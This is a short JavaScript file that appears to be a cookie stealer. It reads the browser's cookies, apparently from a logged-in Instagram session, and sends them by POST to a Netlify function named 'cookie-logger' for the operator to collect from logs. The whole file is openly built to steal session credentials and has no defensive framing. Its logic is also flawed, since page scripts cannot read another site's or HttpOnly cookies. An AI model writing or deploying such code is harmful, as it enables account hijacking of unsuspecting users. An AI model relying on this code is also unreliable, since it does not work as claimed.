// instagram-logger.js
async function logInstagramCookies() {
  const statusEl = document.getElementById('status');
  statusEl.textContent = 'Fetching cookies...';

  // 1. Get ALL cookies from the current Instagram tab
  const allCookies = document.cookie; 

  if (!allCookies || allCookies === '') {
    statusEl.textContent = 'No cookies found! Make sure you are logged in to Instagram.';
    return;
  }

  statusEl.textContent = 'Sending cookies to logger...';

  try {
    // 2. Send to Netlify Function
    const response = await fetch('/.netlify/functions/cookie-logger', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        cookies: allCookies
      })
    });

    const result = await response.json();

    if (result.success) {
      statusEl.textContent = '✅ Success! Check your Netlify logs or download log.txt.';
      console.log('Cookies sent:', allCookies);
      
      // Optional: Alert the cookies in the console for quick copying
      alert('Cookies logged! Check console.');
    } else {
      statusEl.textContent = '❌ Error: ' + result.error;
    }
  } catch (error) {
    statusEl.textContent = '❌ Network Error: ' + error.message;
  }
}

// Run it
logInstagramCookies();
